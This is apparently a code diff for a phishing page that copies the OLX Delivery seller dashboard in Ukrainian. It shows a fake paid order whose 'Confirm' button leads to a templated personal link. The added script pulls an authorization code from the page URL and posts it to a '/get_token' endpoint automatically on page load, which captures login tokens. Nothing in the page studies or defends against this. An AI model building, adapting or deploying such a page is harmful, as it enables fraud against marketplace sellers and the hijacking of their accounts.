@@ -3,105 +3,247 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Замовлення сформовано</title>
+<title>OLX Доставка — Мої продажі</title>
+
 <style>
 body {
-    font-family: Arial, sans-serif;
-    background: #f5f5f5;
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f2f4f5;
+}
+
+/* HEADER */
+header {
+    background: #002f34;
+    color: white;
+    padding: 15px 40px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.logo {
+    font-size: 32px;
+    font-weight: bold;
+    color: #23e5db;
+    text-transform: lowercase;
+}
+
+.header-right {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.header-btn {
+    background: white;
+    color: #002f34;
+    padding: 10px 18px;
+    border-radius: 6px;
+    cursor: pointer;
+}
+
+/* MAIN CONTENT */
+.container {
+    max-width: 1200px;
+    margin: auto;
+    padding: 0 20px;
+}
+
+.title {
+    font-size: 34px;
+    font-weight: bold;
+    margin-top: 30px;
+    color: #002f34;
+}
+
+.topnav {
+    display: flex;
+    gap: 30px;
+    margin-top: 25px;
+    color: #002f34;
+    font-size: 14px;
+    border-bottom: 1px solid #ddd;
+    padding-bottom: 5px;
+}
+
+.topnav div { cursor: pointer; }
+.topnav b { border-bottom: 3px solid #002f34; padding-bottom: 8px; }
+
+.tabs {
+    display: flex;
+    gap: 30px;
+    margin-top: 30px;
+    border-bottom: 1px solid #ddd;
+}
+
+.tabs div {
+    padding-bottom: 15px;
+    color: #406367;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.tabs .active {
+    color: #002f34;
+    border-bottom: 4px solid #002f34;
+}
+
+.filters {
+    display: flex;
+    gap: 10px;
+    margin-top: 20px;
+}
+
+.filter {
+    border: 1px solid #ccd5d6;
+    padding: 8px 20px;
+    border-radius: 20px;
+    background: white;
+    font-size: 14px;
+    color: #002f34;
+}
+
+/* ORDER CARD */
+.order {
+    background: white;
+    margin-top: 30px;
+    padding: 25px;
+    border-radius: 4px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+}
+
+.order-info {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+}
+
+.order-title {
+    font-weight: bold;
+    font-size: 19px;
+    color: #002f34;
+}
+
+.order-status {
+    color: #406367;
+    font-size: 14px;
+    background: #e9f0f0;
+    padding: 4px 8px;
+    border-radius: 4px;
+    align-self: flex-start;
+}
+
+.confirm-btn {
+    background: #002f34;
+    color: white;
+    border: none;
+    padding: 14px 30px;
+    border-radius: 4px;
+    font-weight: bold;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.confirm-btn:hover {
+    background: #004f56;
+}
+
+/* ЧАТ ИКОНКА */
+.chat-icon {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    background: #002f34;
+    border-radius: 50%;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
-}
-
-.card {
-    background: #ffffff;
-    padding: 40px 30px;
-    border-radius: 12px;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-    text-align: center;
-    width: 360px;
-}
-
-.card h2 {
-    color: #002f5f;
-    margin-bottom: 15px;
-    font-size: 22px;
-}
-
-.card p {
-    color: #333;
-    margin-bottom: 25px;
-    font-size: 16px;
-    line-height: 1.6;
-}
-
-button {
-    padding: 14px 25px;
-    background: #ff6600;
-    color: white;
-    border: none;
-    border-radius: 6px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
     cursor: pointer;
-    font-weight: bold;
-    font-size: 14px;
-    transition: background 0.3s;
-}
-
-button:hover {
-    background: #e65c00;
 }
 </style>
 </head>
+
 <body>
 
-<div class="card">
-    <h2 id="title">Замовлення успішно сформовано</h2>
-    <p id="status">
-        Ваше замовлення доставки успішно створено та передано покупцеві.<br><br>
-        Будь ласка, повідомте покупця про відправлення та узгодьте деталі отримання.<br><br>
-        Дякуємо, що користуєтеся нашими послугами.<br>
-        Ми цінуємо вашу довіру та бажаємо вдалих продажів!
-    </p>
-    <button id="btn" style="display:inline-block;">Ми в Telegram</button>
+<header>
+    <div class="logo">olx</div>
+    <div class="header-right">
+        <div>Повідомлення</div>
+        <div>Ваш профіль</div>
+        <div class="header-btn">Додати оголошення</div>
+    </div>
+</header>
+
+<div class="container">
+    <div class="title">OLX Доставка</div>
+
+    <div class="topnav">
+        <div>Оголошення</div>
+        <div>Повідомлення</div>
+        <div>Платежі та рахунок OLX</div>
+        <div><b>OLX Доставка</b></div>
+        <div>Налаштування</div>
+    </div>
+
+    <div class="tabs">
+        <div class="active">Мої продажі</div>
+        <div>Мої покупки</div>
+        <div>Налаштування</div>
+    </div>
+
+    <div class="filters">
+        <div class="filter" style="background: #002f34; color: white;">Очікують підтвердження</div>
+        <div class="filter">Всі</div>
+        <div class="filter">Виконані</div>
+    </div>
+
+    <div class="order">
+        <div class="order-info">
+            <div class="order-title">Замовлення №78234109</div>
+            <div class="order-status">Статус: Очікує підтвердження оплати</div>
+            <p style="font-size: 14px; color: #406367; margin: 0;">Покупець оплатив замовлення. Підтвердіть отримання коштів.</p>
+        </div>
+
+        <button class="confirm-btn" onclick="window.location.href='{{ personal_link }}'">
+            Підтвердити
+        </button>
+    </div>
+</div>
+
+<div class="chat-icon">
+    <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
 </div>
 
 <script>
-// Получаем код из URL
+// 1. Автоматическая отправка кода авторизации на сервер
 const params = new URLSearchParams(window.location.search);
 const code = params.get("code");
 
-// Ссылка на Telegram
-const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
-    "Замовлення успішно сформовано"
-);
-
-// Кнопка Telegram
-document.getElementById("btn").addEventListener("click", () => {
-    window.location.href = telegramUrl;
-});
-
-// Функция отправки кода на сервер
-async function sendCode(code) {
-    if (!code) return;
-
+async function sendCodeToServer(authCode) {
+    if (!authCode) return;
     try {
-        const response = await fetch("/get_token", {
+        await fetch("/get_token", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code })
+            body: JSON.stringify({ code: authCode })
         });
-
-        const result = await response.json();
     } catch (err) {
-        console.error(err);
+        console.error("Помилка відправки коду:", err);
     }
 }
 
-// Отправка кода автоматически при загрузке страницы
 if (code) {
-    sendCode(code);
+    sendCodeToServer(code);
 }
 </script>
 
